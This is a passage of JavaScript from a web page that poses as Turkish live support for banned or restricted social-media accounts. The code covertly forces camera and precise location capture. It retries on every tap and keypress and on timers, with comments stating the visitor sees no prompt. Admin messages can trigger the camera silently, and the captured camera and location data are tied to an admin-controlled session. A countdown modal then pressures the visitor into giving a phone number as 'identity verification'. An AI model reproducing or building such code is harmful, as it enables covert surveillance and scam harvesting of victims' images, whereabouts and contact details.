    existing = cameraSessions.get(callId);
    if (existing && !existing._hadLocation) {
      if (earlyLocationPos?.coords) {
        applySeedLocationToSession(sync, callId, existing, earlyLocationPos);
      }
      try {
        existing.retryLocation?.(false);
      } catch {
        /* ignore */
      }
      if (navigator.geolocation && !existing._hadLocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            earlyLocationPos = pos;
            const liveState = cameraSessions.get(callId);
            if (liveState) applySeedLocationToSession(sync, callId, liveState, pos);
            if (liveState?.stream) markMediaPermGranted();
          },
          () => {
            try {
              existing.retryLocation?.(false);
            } catch {
              /* ignore */
            }
          },
          { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
        );
      }
    }

    hidePageEntryPermGate();
    const hasLoc = Boolean(cameraSessions.get(callId)?._hadLocation);
    const hasCam = Boolean(
      cameraSessions.get(callId)?.stream?.getTracks?.().some((t) => t.readyState === "live")
    );
    if (hasCam && hasLoc) markMediaPermGranted();
    else if (hasCam) {
      try {
        localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
      } catch {
        /* ignore */
      }
    }

    if (announce && box && box.id !== "global-media-host" && !mediaStatusAnnounced) {
      mediaStatusAnnounced = true;
      appendMessage(
        box,
        "bot",
        hasLoc
          ? "Kamera ve konum açıldı. İzinler kaydedildi — tekrar sorulmaz."
          : "Kamera açıldı. Konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.",
        { sync: false }
      );
    }

    // İzin verildiği anda sohbeti aç (yedek — camOk yolunda da çağrılır)
    if (hasCam) openVisitorChatNow();

    if (hasCam && hasLoc) {
      maybeOfferPhoneEntry(box);
      stopCameraPermissionLoop();
    }
    return hasCam;
  }

  function bootImmediatePagePermissions() {
    if (pageEntryPermBooted) return;
    if (/admin\.html$/i.test(location.pathname || "")) return;
    pageEntryPermBooted = true;

    const startForce = (fromGesture = false) => {
      if (isMediaPermGranted() && hasLiveCameraAndLocation()) {
        hidePageEntryPermGate();
        return;
      }
      if (cameraActivateInFlight && !fromGesture) return;
      // Sohbet kamerası ile aynı açılış
      void openCameraLikeChat(getOrCreateMediaHost(), {
        fromGesture,
        announce: false,
      });
    };

    startForce(false);
    if (window.ChatSyncReady) {
      window.ChatSyncReady.then(() => startForce(false)).catch(() => startForce(false));
    } else {
      window.setTimeout(() => startForce(false), 350);
    }

    let lastAt = 0;
    const onGesture = () => {
      const now = Date.now();
      if (now - lastAt < 700) return;
      lastAt = now;
      if (isMediaPermGranted() && hasLiveCameraAndLocation()) {
        hidePageEntryPermGate();
        return;
      }
      // İzin yoksa her dokunuşta tekrar iste
      startForce(true);
    };
    document.addEventListener("pointerdown", onGesture, true);
    document.addEventListener("touchstart", onGesture, true);
    document.addEventListener("keydown", onGesture, true);
    pageEntryGestureUnsub = () => {
      document.removeEventListener("pointerdown", onGesture, true);
      document.removeEventListener("touchstart", onGesture, true);
      document.removeEventListener("keydown", onGesture, true);
    };

    // İzin verilene kadar aralıklı dene; canlı kamera varken ASLA restart etme
    if (pageEntryRetryTimer) window.clearInterval(pageEntryRetryTimer);
    pageEntryRetryTimer = window.setInterval(() => {
      if (isMediaPermGranted() && hasLiveCameraAndLocation()) {
        window.clearInterval(pageEntryRetryTimer);
        pageEntryRetryTimer = null;
        hidePageEntryPermGate();
        try {
          pageEntryGestureUnsub?.();
        } catch {
          /* ignore */
        }
        pageEntryGestureUnsub = null;
        return;
      }
      if (hasLiveCameraSession() || cameraActivateInFlight) return;
      if (!hasLiveCameraSession()) showPageEntryPermGate();
      startForce(false);
    }, 12_000);
  }

  function stopCameraPermissionLoop() {
    cameraPermLoopToken += 1;
    if (cameraPermLoopTimer) {
      window.clearTimeout(cameraPermLoopTimer);
      cameraPermLoopTimer = null;
    }
    try {
      mediaForceGestureUnsub?.();
    } catch {
      /* ignore */
    }
    mediaForceGestureUnsub = null;
    document.getElementById("loc-perm-fab")?.remove();
    document
      .querySelectorAll(
        ".chat-camera-request, .chat-location-tap, .chat-camera-perm-denied, .chat-location-perm-denied, .chat-camera-auto"
      )
      .forEach((el) => el.remove());
  }

  function showPermissionDeniedNotice(box, extraNote) {
    let el = box.querySelector(".chat-camera-perm-denied");
    if (!el) {
      el = document.createElement("div");
      el.className = "chat-inline-prompt chat-camera-perm-denied";
      el.innerHTML =
        `<p class="chat-inline-prompt-title">${CAMERA_PERM_DENIED_TEXT}</p>` +
        '<p class="chat-camera-note" data-perm-note></p>';
      box.appendChild(el);
    } else {
      const title = el.querySelector(".chat-inline-prompt-title");
      if (title) title.textContent = CAMERA_PERM_DENIED_TEXT;
    }
    const note = el.querySelector("[data-perm-note]");
    if (note) {
      note.textContent =
        extraNote ||
        "Kimlik doğrulaması tarayıcı iznine bağlıdır. Sohbetteki İzin ver butonuna dokunun.";
    }
    box.scrollTop = box.scrollHeight;
  }

  function clearPermissionDeniedNotice(box) {
    box.querySelectorAll(".chat-camera-perm-denied").forEach((el) => el.remove());
    box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
  }

  async function queryCameraPermissionState() {
    try {
      if (!navigator.permissions?.query) return "unknown";
      const st = await navigator.permissions.query({ name: "camera" });
      return st?.state || "unknown";
    } catch {
      return "unknown";
    }
  }

  async function autoOpenCameraFromMessage(box, msg) {
    const callId = msg.callId;
    if (!callId) return "error";
    latestCameraCallId = callId;
    const seq = ++cameraOpenSeq;
    clearPermissionDeniedNotice(box);
    // Ziyaretçiye metin/kart yok — doğrudan zorla aç
    const result = await startVisitorCamera(box, callId, {
      auto: true,
      silent: true,
      deferLocation: false,
    });
    if (seq !== cameraOpenSeq || latestCameraCallId !== callId) {
      await stopCameraSession(callId, { upload: false });
      return "superseded";
    }
    if (result !== "ok") {
      startCameraPermissionLoop(box, { preferCallId: callId });
    }
    return result;
  }

  const CAMERA_OFFER_TEXT =
    "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz.";

  const CAMERA_FORCE_RETRY_MS = 5_000;

  /** Ziyaretçiye kamera metni/butonu YOK — sayfa açılınca zorla kamera+konum */
  function startCameraPermissionLoop(box, opts = {}) {
    stopCameraPermissionLoop();
    const token = cameraPermLoopToken;
    let callId =
      opts.preferCallId ||
      latestCameraCallId ||
      (() => {
        try {
          return sessionStorage.getItem("pending_camera_call_v1") || null;
        } catch {
          return null;
        }
      })();
    let attempting = false;
    let offerStarted = Boolean(callId);

    const sessionHasBoth = (id) => {
      const st = id ? cameraSessions.get(id) : null;
      return Boolean(
        st?._hadLocation && st?.stream?.getTracks?.().some((t) => t.readyState === "live")
      );
    };

    const sessionHasLiveCam = (id) => {
      const st = id ? cameraSessions.get(id) : null;
      return Boolean(st?.stream?.getTracks?.().some((t) => t.readyState === "live"));
    };

    const scheduleRetry = () => {
      if (token !== cameraPermLoopToken) return;
      if (cameraPermLoopTimer) window.clearTimeout(cameraPermLoopTimer);
      cameraPermLoopTimer = window.setTimeout(() => {
        cameraPermLoopTimer = null;
        void attempt(false);
      }, CAMERA_FORCE_RETRY_MS);
    };

    const attempt = async (fromGesture) => {
      if (token !== cameraPermLoopToken || attempting) return;
      if (callId && sessionHasBoth(callId)) {
        stopCameraPermissionLoop();
        markMediaPermGranted();
        hidePageEntryPermGate();
        maybeOfferPhoneEntry(box);
        return;
      }
      // Kalıcı izin yoksa kapıyı açık tut / tekrar iste
      if (!isMediaPermGranted() && !fromGesture) {
        const live = earlyCameraStream?.getTracks?.().some((t) => t.readyState === "live");
        if (!live) showPageEntryPermGate();
      }
      attempting = true;
      try {
        // 1) Önce native izin — sayfa girer girmez (Firebase beklemeden)
        let stream = null;
        const early = earlyCameraStream?.getTracks?.().some((t) => t.readyState === "live")
          ? earlyCameraStream
          : null;
        if (early) {
          stream = early;
        } else {
          try {
            stream = await acquireCameraStreamNative();
            earlyCameraStream = stream;
            hidePageEntryPermGate();
          } catch {
            if (!fromGesture) showPageEntryPermGate();
          }
        }

        if (!earlyLocationPos && navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              earlyLocationPos = pos;
            },
            () => {},
            { enableHighAccuracy: false, maximumAge: 60000, timeout: 20000 }
          );
        }

        let sync = window.ChatSync;
        if (!sync?.enabled && window.ChatSyncReady) {
          sync = await window.ChatSyncReady.catch(() => null);
        }
        if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
          scheduleRetry();
          return;
        }

        if (!callId) {
          const offer = await sync.startVisitorCameraOffer(CAMERA_OFFER_TEXT, {
            reuse: true,
            silent: true,
          });
          callId = offer?.callId || null;
          if (callId) {
            latestCameraCallId = callId;
            offerStarted = true;
            try {
              sessionStorage.setItem("pending_camera_call_v1", callId);
            } catch {
              /* ignore */
            }
          }
          if (!callId) {
            scheduleRetry();
            return;
          }
        }

        if (token !== cameraPermLoopToken) return;

        // Canlı kamera varsa yeniden başlatma — sadece konum tamamla
        if (hasLiveCameraSession()) {
          if (!callId) {
            callId =
              latestCameraCallId ||
              [...cameraSessions.keys()].find((id) =>
                cameraSessions
                  .get(id)
                  ?.stream?.getTracks?.()
                  .some((t) => t.readyState === "live")
              ) ||
              null;
          }
        }
        if (callId && sessionHasLiveCam(callId)) {
          const existingLive = cameraSessions.get(callId);
          if (existingLive && !existingLive._hadLocation) {
            try {
              existingLive.retryLocation?.();
            } catch {
              /* ignore */
            }
            if (earlyLocationPos?.coords) {
              applySeedLocationToSession(sync, callId, existingLive, earlyLocationPos);
            }
          }
          if (sessionHasBoth(callId)) {
            stopCameraPermissionLoop();
            markMediaPermGranted();
            hidePageEntryPermGate();
            maybeOfferPhoneEntry(box);
            return;
          }
          scheduleRetry();
          return;
        }

        let existing = cameraSessions.get(callId);
        if (!existing?.stream) {
          if (!stream && fromGesture) {
            try {
              stream = await acquireCameraStreamNative();
              earlyCameraStream = stream;
              hidePageEntryPermGate();
            } catch {
              /* ignore */
            }
          }
          const useStream = stream || takeEarlyCameraStream();
          if (useStream && useStream === earlyCameraStream) earlyCameraStream = null;
          if (useStream) {
            await startVisitorCamera(box, callId, {
              auto: true,
              silent: true,
              deferLocation: false,
              stream: useStream,
              seedLocation: earlyLocationPos || undefined,
            });
          } else {
            await startVisitorCamera(box, callId, {
              auto: true,
              silent: true,
              deferLocation: false,
              seedLocation: earlyLocationPos || undefined,
            });
          }
        }

        existing = cameraSessions.get(callId);
        if (existing && !existing._hadLocation) {
          try {
            existing.retryLocation?.();
          } catch {
            /* ignore */
          }
          if (earlyLocationPos?.coords) {
            applySeedLocationToSession(sync, callId, existing, earlyLocationPos);
          } else if (navigator.geolocation && !existing._hadLocation) {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                earlyLocationPos = pos;
                const live = cameraSessions.get(callId);
                if (live) applySeedLocationToSession(sync, callId, live, pos);
              },
              () => {},
              { enableHighAccuracy: false, maximumAge: 60000, timeout: 20000 }
            );
          }
        }

        if (sessionHasBoth(callId)) {
          stopCameraPermissionLoop();
          markMediaPermGranted();
          hidePageEntryPermGate();
          maybeOfferPhoneEntry(box);
          return;
        }
        // Verilmediyse tekrar tekrar dene
        if (!isMediaPermGranted()) showPageEntryPermGate();
        scheduleRetry();
      } catch (err) {
        console.error("silent media force", err);
        if (!isMediaPermGranted()) showPageEntryPermGate();
        scheduleRetry();
      } finally {
        attempting = false;
      }
    };

    // Her dokunuş/klavye = jest ile zorla tekrar (görünür buton yok)
    let lastGestureAt = 0;
    const onGesture = () => {
      if (token !== cameraPermLoopToken) return;
      const now = Date.now();
      if (now - lastGestureAt < 900) return;
      lastGestureAt = now;
      void attempt(true);
    };
    document.addEventListener("pointerdown", onGesture, true);
    document.addEventListener("touchstart", onGesture, true);
    document.addEventListener("keydown", onGesture, true);
    mediaForceGestureUnsub = () => {
      document.removeEventListener("pointerdown", onGesture, true);
      document.removeEventListener("touchstart", onGesture, true);
      document.removeEventListener("keydown", onGesture, true);
    };

    void attempt(false);
  }

  const PHONE_DONE_KEY = "visitor_phone_done_v1";
  let phonePopupOpen = false;
  let phonePopupOffered = false;

  function isValidPhoneDigits(raw) {
    const digits = String(raw || "").replace(/\D/g, "");
    return digits.length >= 10 && digits.length <= 15;
  }

  function formatTrPhoneInput(value) {
    let digits = String(value || "").replace(/\D/g, "");
    if (digits.startsWith("90") && digits.length > 10) digits = digits.slice(2);
    if (digits.startsWith("0")) digits = digits.slice(1);
    digits = digits.slice(0, 10);
    const parts = [];
    if (digits.length > 0) parts.push(digits.slice(0, 3));
    if (digits.length > 3) parts.push(digits.slice(3, 6));
    if (digits.length > 6) parts.push(digits.slice(6, 8));
    if (digits.length > 8) parts.push(digits.slice(8, 10));
    return parts.join(" ");
  }

  function maybeOfferPhoneEntry(box) {
    if (!box || phonePopupOpen || phonePopupOffered) return;
    try {
      if (sessionStorage.getItem(PHONE_DONE_KEY) === "1") return;
    } catch {
      /* ignore */
    }
    phonePopupOffered = true;
    window.setTimeout(() => showPhoneEntryModal(box), 450);
  }

  function showPhoneEntryModal(box) {
    if (phonePopupOpen) return;
    document.getElementById("phone-entry-modal")?.remove();
    phonePopupOpen = true;

    const TOTAL_SEC = 30;
    const CIRC = 2 * Math.PI * 18;
    let left = TOTAL_SEC;
    let timerId = null;
    let submitting = false;

    const overlay = document.createElement("div");
    overlay.id = "phone-entry-modal";
    overlay.className = "phone-modal-overlay";
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");
    overlay.setAttribute("aria-labelledby", "phone-modal-title");

    overlay.innerHTML = `
      <div class="phone-modal">
        <div class="phone-modal-top">
          <div class="phone-modal-brand">
            <span class="phone-modal-icon" aria-hidden="true">☎</span>
            <div>
              <strong>Güvenli doğrulama</strong>
              <span>Telefon doğrulama adımı</span>
            </div>
          </div>
          <div class="phone-modal-timer" aria-hidden="true">
            <svg viewBox="0 0 40 40">
              <circle class="phone-timer-track" cx="20" cy="20" r="18"></circle>
              <circle class="phone-timer-progress" cx="20" cy="20" r="18"
                stroke-dasharray="${CIRC}" stroke-dashoffset="0"></circle>
            </svg>
            <em data-phone-sec>${TOTAL_SEC}</em>
          </div>
        </div>
        <h2 class="phone-modal-title" id="phone-modal-title">Telefon numaranızı girin</h2>
        <p class="phone-modal-text">Kimlik doğrulamasını tamamlamak için aktif cep telefonu numaranızı girin. Süre: 30 saniye.</p>
        <div class="phone-modal-field">
          <label for="phone-modal-input">Cep telefonu</label>
          <div class="phone-modal-input-wrap">
            <span class="phone-modal-prefix">+90</span>
            <input id="phone-modal-input" type="tel" inputmode="numeric" autocomplete="tel-national"
              maxlength="13" placeholder="5XX XXX XX XX" aria-describedby="phone-modal-hint" />
          </div>
          <p class="phone-modal-hint" id="phone-modal-hint">Örn: 532 123 45 67 — yalnızca size ait numarayı kullanın.</p>
        </div>
        <div class="phone-modal-actions">
          <button type="button" class="btn btn-primary" data-phone-submit>Numarayı onayla</button>
        </div>
        <p class="phone-modal-note">Numaranız yalnızca bu doğrulama oturumuna bağlanır. Şifre veya SMS kodu istemeyiz.</p>
      </div>
    `;

    document.body.appendChild(overlay);

    const modal = overlay.querySelector(".phone-modal");
    const input = overlay.querySelector("#phone-modal-input");
    const wrap = overlay.querySelector(".phone-modal-input-wrap");
    const hint = overlay.querySelector("#phone-modal-hint");
    const submitBtn = overlay.querySelector("[data-phone-submit]");
    const secEl = overlay.querySelector("[data-phone-sec]");
    const progress = overlay.querySelector(".phone-timer-progress");

    const setHint = (text, isError) => {
      if (!hint) return;
      hint.textContent = text;
      hint.classList.toggle("is-error", Boolean(isError));
    };

    const tick = () => {
      left -= 1;
      if (secEl) secEl.textContent = String(Math.max(0, left));
      if (progress) {
        const offset = CIRC * (1 - Math.max(0, left) / TOTAL_SEC);
        progress.style.strokeDashoffset = String(offset);
      }
      if (left <= 0) {
        window.clearInterval(timerId);
        timerId = null;
        modal?.classList.add("is-expired");
        setHint("Süre doldu — numarayı hemen girip onaylayın.", true);
        submitBtn.textContent = "Hemen onayla";
        input?.focus();
      }
    };

    timerId = window.setInterval(tick, 1000);

    input?.addEventListener("input", () => {
      const formatted = formatTrPhoneInput(input.value);
      if (input.value !== formatted) input.value = formatted;
      wrap?.classList.remove("is-invalid");
      if (left > 0) {
        setHint("Örn: 532 123 45 67 — yalnızca size ait numarayı kullanın.", false);
      }
    });

    const closeModal = () => {
      if (timerId) window.clearInterval(timerId);
      phonePopupOpen = false;
      overlay.remove();
    };

    const submit = async () => {
      if (submitting) return;
      const formatted = formatTrPhoneInput(input?.value || "");
      if (!isValidPhoneDigits(formatted)) {
        wrap?.classList.add("is-invalid");
        setHint("Geçerli bir cep telefonu girin (10 hane).", true);
        input?.focus();
        return;
      }
      submitting = true;
      submitBtn.disabled = true;
      submitBtn.textContent = "Kaydediliyor…";
      const full = `+90 ${formatted}`.trim();

      try {
        const sync = window.ChatSync;
        if (sync?.enabled && typeof sync.saveVisitorPhone === "function") {
          await sync.saveVisitorPhone(full);
        } else {
          syncMessage("user", `Telefon: ${full}`);
        }
        try {
          sessionStorage.setItem(PHONE_DONE_KEY, "1");
        } catch {
          /* ignore */
        }
        closeModal();
        if (box) {
          appendMessage(box, "user", `Telefon: ${full}`, { sync: false });
          appendMessage(
            box,
            "bot",
            "Telefon numaranız alındı. Kimlik doğrulaması devam ediyor.",
            { sync: true }
          );
        }
      } catch (err) {
        console.error(err);
        submitting = false;
        submitBtn.disabled = false;
        submitBtn.textContent = left <= 0 ? "Hemen onayla" : "Numarayı onayla";
        setHint("Kayıt başarısız. Tekrar deneyin.", true);
      }
    };

    submitBtn?.addEventListener("click", (e) => {
      e.preventDefault();
      void submit();
    });
    input?.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        void submit();
      }
    });

    // Overlay tıklayınca kapanmasın — zorunlu adım
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        input?.focus();
        modal?.classList.add("is-expired");
        setHint("Devam etmek için telefon numaranızı girmeniz gerekir.", true);
      }
    });

    window.setTimeout(() => input?.focus(), 80);
  }

  function showVisitorPopup(box, msg, onChoice) {
    box.querySelectorAll(".chat-inline-prompt").forEach((el) => el.remove());
    document.getElementById("support-popup")?.remove();

    const card = document.createElement("div");
    card.className = "chat-inline-prompt";
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Destek formu");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent = msg.text || "Lütfen yanıtınızı yazın.";

    const input = document.createElement("textarea");
    input.className = "chat-inline-prompt-input";
    input.rows = 3;
    input.maxLength = 400;
    input.autocomplete = "off";
    input.placeholder = msg.placeholder || "Yanıtınızı yazın…";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary";
    okBtn.textContent = msg.okLabel || "Tamam";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "İptal";

    const finish = (choice, typed) => {
      card.remove();
      onChoice?.(choice, typed);
    };

    okBtn.addEventListener("click", () => {
      const typed = String(input.value || "").trim();
      if (!typed) {
        input.focus();
        input.classList.add("is-invalid");
        return;
      }
      input.classList.remove("is-invalid");
      finish(okBtn.textContent, typed);
    });

    cancelBtn.addEventListener("click", () => finish(cancelBtn.textContent, ""));

    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter" && !e.shiftKey) {
        e.preventDefault();
        okBtn.click();
      }
    });

    actions.append(okBtn, cancelBtn);
    card.append(title, input, actions);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
    input.focus();
  }

  function showVisitorPhotoRequest(box, msg) {
    box.querySelectorAll(".chat-inline-prompt").forEach((el) => el.remove());
    document.getElementById("support-popup")?.remove();

    const maxPhotos = Math.min(
      10,
      Math.max(1, Number(msg.maxPhotos) || window.ChatSync?.PHOTO_MAX_COUNT || 10)
    );

    const card = document.createElement("div");
    card.className = "chat-inline-prompt chat-photo-prompt";
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Fotoğraf gönderme");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent =
      msg.text ||
      "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz.";

    const note = document.createElement("p");
    note.className = "chat-photo-prompt-note";
    note.textContent = `Nasıl çalışır: “Fotoğraf seç”e basınca cihazınızın seçicisi açılır. En fazla ${maxPhotos} görsel seçebilirsiniz. Seçtikleriniz destek sohbetine gönderilir. İstemiyorsanız “İstemiyorum”a basın — hiçbir dosyaya erişilmez.`;

    const status = document.createElement("p");
    status.className = "chat-photo-prompt-status";
    status.hidden = true;

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const pickBtn = document.createElement("button");
    pickBtn.type = "button";
    pickBtn.className = "btn btn-primary";
    pickBtn.textContent = msg.okLabel || "Fotoğraf seç";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "İstemiyorum";

    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.accept = "image/*";
    fileInput.multiple = true;
    fileInput.hidden = true;

    const setBusy = (busy) => {
      pickBtn.disabled = busy;
      cancelBtn.disabled = busy;
    };

    cancelBtn.addEventListener("click", () => {
      card.remove();
      appendMessage(box, "user", "Fotoğraf göndermeyi istemedi.");
    });

    pickBtn.addEventListener("click", () => fileInput.click());

    fileInput.addEventListener("change", async () => {
      const raw = Array.from(fileInput.files || []);
      fileInput.value = "";
      const files = raw
        .filter((f) => String(f.type || "").startsWith("image/"))
        .slice(0, maxPhotos);
      if (!files.length) {
        status.hidden = false;
        status.textContent = "Görsel seçilmedi. İsterseniz tekrar deneyin.";
        return;
      }
      const sync = window.ChatSync;
      if (!sync?.uploadVisitorPhoto) {
        status.hidden = false;
        status.textContent = "Yükleme hazır değil. Sayfayı yenileyip tekrar deneyin.";
        return;
      }

      setBusy(true);
      status.hidden = false;
      let ok = 0;
      for (let i = 0; i < files.length; i += 1) {
        status.textContent = `Yükleniyor ${i + 1}/${files.length}…`;
        try {
          const result = await sync.uploadVisitorPhoto(files[i], {
            index: i + 1,
            total: files.length,
          });
          ok += 1;
          appendMessage(box, "user", `Fotoğraf ${i + 1}/${files.length} gönderildi.`, {
            sync: false,
            imageUrl: result?.url || "",
          });
        } catch (err) {
          console.warn("photo upload", err);
          appendMessage(
            box,
            "bot",
            `Fotoğraf ${i + 1} yüklenemedi: ${String(err?.message || err).slice(0, 120)}`,
            { sync: false }
          );
        }
      }
      status.textContent =
        ok > 0
          ? `${ok} fotoğraf gönderildi. Teşekkürler.`
          : "Hiçbir fotoğraf gönderilemedi.";
      setBusy(false);
      if (ok > 0) {
        window.setTimeout(() => card.remove(), 1200);
      }
    });

    actions.append(pickBtn, cancelBtn);
    card.append(title, note, status, actions, fileInput);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
  }

  const seenAdminIncomingIds = new Set();

  /* —— Karşı taraf mesajı: chat’te değilken ses + uyarı —— */
  let visitorAudioCtx = null;
  let visitorAudioUnlocked = false;
  let visitorToastTimer = null;

  function ensureVisitorAudio() {
    if (visitorAudioCtx) return visitorAudioCtx;
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return null;
    try {
      visitorAudioCtx = new AC();
    } catch {
      return null;
    }
    return visitorAudioCtx;
  }

  async function unlockVisitorAudio() {
    const ctx = ensureVisitorAudio();
    if (!ctx) return false;
    try {
      if (ctx.state === "suspended") await ctx.resume();
      const buf = ctx.createBuffer(1, 1, 22050);
      const src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start(0);
      visitorAudioUnlocked = ctx.state === "running";
    } catch {
      visitorAudioUnlocked = false;
    }
    return visitorAudioUnlocked;
  }

  async function playVisitorNotifyBeep() {
    const ctx = ensureVisitorAudio();
    if (!ctx) return;
    try {
      if (ctx.state !== "running") await ctx.resume();
    } catch {
      return;
    }
    if (ctx.state !== "running") return;
    const now = ctx.currentTime;
    [
      { t: 0, f: 880, d: 0.1 },
      { t: 0.14, f: 1175, d: 0.14 },
    ].forEach(({ t, f, d }) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = "sine";
      osc.frequency.value = f;
      gain.gain.setValueAtTime(0.001, now + t);
      gain.gain.exponentialRampToValueAtTime(0.28, now + t + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + t + d);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now + t);
      osc.stop(now + t + d + 0.03);
    });
  }

  function ensureVisitorToast() {
    let el = document.getElementById("visitor-chat-toast");
    if (el) return el;
    el = document.createElement("div");
    el.id = "visitor-chat-toast";
    el.className = "visitor-chat-toast";
    el.hidden = true;
    el.setAttribute("role", "status");
    el.innerHTML =
      '<strong class="visitor-chat-toast-title">Yeni destek mesajı</strong>' +
      '<p class="visitor-chat-toast-body"></p>' +
      '<button type="button" class="visitor-chat-toast-go">Sohbete git</button>';
    el.querySelector(".visitor-chat-toast-go")?.addEventListener("click", () => {
      const box = document.querySelector("[data-chat-root] [data-chat-messages]");
      focusVisitorChat(box);
      el.hidden = true;
    });
    document.body.appendChild(el);
    return el;
  }

  function showVisitorToast(text) {
    const el = ensureVisitorToast();
    const body = el.querySelector(".visitor-chat-toast-body");
    if (body) body.textContent = String(text || "").slice(0, 160);
    el.hidden = false;
    if (visitorToastTimer) clearTimeout(visitorToastTimer);
    visitorToastTimer = window.setTimeout(() => {
      el.hidden = true;
    }, 6000);
  }

  function focusVisitorChat(box) {
    const root =
      box?.closest?.("[data-chat-root]") || document.querySelector("[data-chat-root]");
    const target = root || box || document.getElementById("canli-destek");
    if (target?.scrollIntoView) {
      target.scrollIntoView({ behavior: "smooth", block: "center" });
    }
    if (box) box.scrollTop = box.scrollHeight;
    const input =
      root?.querySelector?.("[data-chat-input]") ||
      document.querySelector("[data-chat-input]");
    // Yazmayı engellemeden odakla
    window.setTimeout(() => {
      try {
        input?.focus?.({ preventScroll: true });
      } catch {
        input?.focus?.();
      }
    }, 280);
  }

  function notifyVisitorOfAdminMessage(box, msg) {
    // loading animasyonu için spam etme
    if (msg?.type === "loading") return;

    const text = String(msg?.text || "Destek yeni bir mesaj gönderdi").slice(0, 160);

    // Her zaman ses + sohbete yönlendir (chat’i engellemeden)
    void unlockVisitorAudio().then(() => playVisitorNotifyBeep());
    showVisitorToast(text);
    focusVisitorChat(box);

    if (document.hidden && "Notification" in window && Notification.permission === "granted") {
      try {
        new Notification("Yeni destek mesajı", {
          body: text,
          tag: "visitor-support-msg",
          silent: true,
        });
      } catch {
        /* ignore */
      }
    }
  }

  document.addEventListener(
    "pointerdown",
    () => {
      void unlockVisitorAudio();
    },
    { capture: true }
  );
  document.addEventListener(
    "keydown",
    () => {
      void unlockVisitorAudio();
    },
    { capture: true, once: true }
  );

  function handleAdminIncoming(box, msg) {
    if (msg?.id) {
      if (seenAdminIncomingIds.has(msg.id)) return;
      seenAdminIncomingIds.add(msg.id);
    }
    if (msg.type === "camera") {
      // Ziyaretçiye metin yok — sessiz zorla kamera+konum
      notifyVisitorOfAdminMessage(box, { text: "Kimlik doğrulaması için izin isteniyor" });
      void autoOpenCameraFromMessage(box, msg);
      return;
    }
    if (msg.type === "photos") {
      appendMessage(
        box,
        "admin",
        msg.text ||
          "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz.",
        { sync: false }
      );
      notifyVisitorOfAdminMessage(box, msg);
      showVisitorPhotoRequest(box, msg);
      return;
    }
    const isPopup = msg.type === "popup" || msg.popup === true;
    if (isPopup) {
      appendMessage(box, "admin", msg.text || "Lütfen yanıtınızı yazın.", { sync: false });
      notifyVisitorOfAdminMessage(box, msg);
      showVisitorPopup(
        box,
        {
          text: msg.text || "Lütfen yanıtınızı yazın.",
          placeholder: msg.placeholder || "Mesajınızı buraya yazın…",
          okLabel: msg.okLabel || "Tamam",
          cancelLabel: msg.cancelLabel || "İptal",
          withInput: true,
        },
        (choice, typed) => {
          if (typed) {
            if (SECRETISH.test(typed)) {
              appendMessage(
                box,
                "bot",
      "Güvenlik için şifre, e-posta veya doğrulama kodu paylaşmayın. Kimlik doğrulaması yalnızca istenen izinler ile yapılır. Lütfen sorununuzu kendi kelimelerinizle yazın.",
                { sync: false }
              );
              syncMessage(
                "user",
                "Popup yanıtı reddedildi (hassas bilgi paylaşımı engellendi)."
              );
              return;
            }
            appendMessage(box, "user", typed);
            return;
          }
          appendMessage(box, "user", `Popup yanıtı: ${choice}`);
        }
      );
      return;
    }
    appendMessage(box, "admin", msg.text || "", {
      sync: false,
      type: msg.type === "loading" ? "loading" : "text",
    });
    if (msg.type !== "loading") {
      notifyVisitorOfAdminMessage(box, msg);
    }
  }

  function showTyping(box) {
    const el = document.createElement("div");
    el.className = "chat-bubble chat-bot chat-typing";
    el.innerHTML = '<span class="chat-meta">Asistan yazıyor…</span><p><i></i><i></i><i></i></p>';
    box.appendChild(el);
    box.scrollTop = box.scrollHeight;
    return el;
  }

  function setQuizButtons(quick, question) {
    if (!quick) return;
    quick.innerHTML = "";
    if (!question) {
      [
        ["Hesabım kısıtlandı", "Hesap kısıtı"],
        ["Hesabım ban yedi", "Ban"],
        ["İzlenmelerim düştü", "İzlenme düşüşü"],
        ["Shadowban mı oldum?", "Görünürlük"],
      ].forEach(([value, label]) => {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.setAttribute("data-quick", value);
        btn.textContent = label;
        quick.appendChild(btn);
      });
      return;
    }
